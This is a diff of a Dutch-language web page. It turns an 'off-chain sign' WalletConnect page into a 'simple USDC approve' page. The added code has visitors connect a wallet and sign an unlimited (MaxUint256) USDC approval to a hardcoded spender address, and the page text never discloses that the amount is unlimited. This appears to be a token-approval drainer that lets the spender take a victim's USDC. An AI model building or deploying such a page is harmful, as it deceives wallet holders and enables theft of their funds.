@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Zomyto WalletConnect v2 - Off-chain Sign</title>
+  <title>Eenvoudige Approve via WalletConnect v2</title>
 
   <!-- Ethers v5 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -14,45 +14,49 @@
 
   <style>
     body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px;}
-    button { background:#1e88e5; color:white; padding:15px 25px; border:none; border-radius:8px; font-size:1.1rem; cursor:pointer; margin: 10px;}
+    button { background:#1e88e5; color:white; padding:12px 20px; border:none; border-radius:8px; font-size:1rem; cursor:pointer; margin: 10px;}
     button:disabled { background:grey; cursor:not-allowed; }
     #status { margin-top:20px; font-size:0.9rem; color:#ccc; }
-    #signatureBox { margin-top:20px; max-width:90%; word-wrap:break-word; margin-left:auto; margin-right:auto; font-size:0.8rem; color:#a5d6a7; }
   </style>
 </head>
 <body>
 
-  <h1>Zomyto WalletConnect v2</h1>
-  <p>
-    Verbind je mobiele wallet (bijv. Exodus) via WalletConnect en teken een off-chain bericht.<br>
-    Geen gas, geen on-chain transacties.
-  </p>
+  <h1>Eenvoudige USDC Approve</h1>
+  <p>1. Verbind je mobiele wallet (bijv. Exodus) via WalletConnect.<br>2. Klik op "Approve USDC".</p>
 
   <!-- Web3Modal connect button -->
   <w3m-button></w3m-button>
 
   <div style="margin-top:30px;">
-    <button id="signBtn" disabled>🖊️ Sign Off-chain Approval</button>
+    <button id="approveBtn" disabled>✅ Approve USDC</button>
   </div>
 
   <div id="status">Status: Niet verbonden</div>
-  <div id="signatureBox"></div>
 
   <script>
-    // ========= CONFIG =========
+    // ===== CONFIG =====
     const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WalletConnect v2 projectId
 
-    // We still define Ethereum mainnet as chain (purely for context)
-    const ETH_MAINNET = 1;
+    // Ethereum mainnet
+    const CHAIN_ID = 1;
     const RPC_URL = "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2";
+
+    // USDC mainnet
+    const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+
+    // SPENDER: vervang dit door jouw contract/adres dat USDC mag uitgeven
+    const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";
+
+    const tokenABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
 
     const { EthereumClient, w3mConnectors, w3mProvider } = window.W3mEthereum;
     const { Web3Modal } = window.W3mHtml;
 
-    // Chain config (for Web3Modal / ethers context)
     const chainsConfig = [
       {
-        id: ETH_MAINNET,
+        id: CHAIN_ID,
         name: "Ethereum",
         network: "homestead",
         nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
@@ -79,21 +83,15 @@
       ethereumClient
     );
 
-    // ========= ETHERS PROVIDER / SIGNER =========
     let ethersProvider = null;
     let signer = null;
 
     const statusEl = document.getElementById("status");
-    const signBtn = document.getElementById("signBtn");
-    const signatureBox = document.getElementById("signatureBox");
+    const approveBtn = document.getElementById("approveBtn");
 
     function setStatus(msg) {
       console.log(msg);
       statusEl.textContent = "Status: " + msg;
-    }
-
-    function showSignature(sig) {
-      signatureBox.textContent = "Signature:\n" + sig;
     }
 
     async function initEthersFromWallet() {
@@ -111,5 +109,56 @@
         const network = await ethersProvider.getNetwork();
         setStatus(`Verbonden met ${address} op chainId ${network.chainId}`);
 
-        signBtn.disabled = false;
-      } catch (err
+        if (Number(network.chainId) !== CHAIN_ID) {
+          alert("Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet.");
+        }
+
+        approveBtn.disabled = false;
+      } catch (err) {
+        console.error(err);
+        setStatus("Fout bij initialiseren ethers: " + err.message);
+        approveBtn.disabled = true;
+      }
+    }
+
+    // Reageer op connect/disconnect
+    ethereumClient.watchAccount((account) => {
+      if (account.isConnected) {
+        setStatus("Wallet verbonden, initialiseer ethers...");
+        initEthersFromWallet();
+      } else {
+        setStatus("Niet verbonden");
+        approveBtn.disabled = true;
+        signer = null;
+        ethersProvider = null;
+      }
+    });
+
+    // ===== APPROVE KNOP =====
+    approveBtn.onclick = async () => {
+      if (!signer) {
+        alert("Geen signer gevonden. Verbind eerst je wallet.");
+        return;
+      }
+
+      try {
+        setStatus("Verstuur USDC approve transactie...");
+        const usdc = new ethers.Contract(USDC_ADDRESS, tokenABI, signer);
+
+        // MaxUint256 = onbeperkt
+        const tx = await usdc.approve(SPENDER, ethers.constants.MaxUint256);
+        setStatus("Wachten op bevestiging van de transactie...");
+        await tx.wait();
+
+        setStatus("USDC succesvol goedgekeurd!");
+        alert("USDC succesvol goedgekeurd!");
+      } catch (err) {
+        console.error(err);
+        setStatus("Fout bij approve: " + err.message);
+        alert("Fout bij approve: " + err.message);
+      }
+    };
+  </script>
+
+</body>
+</html>
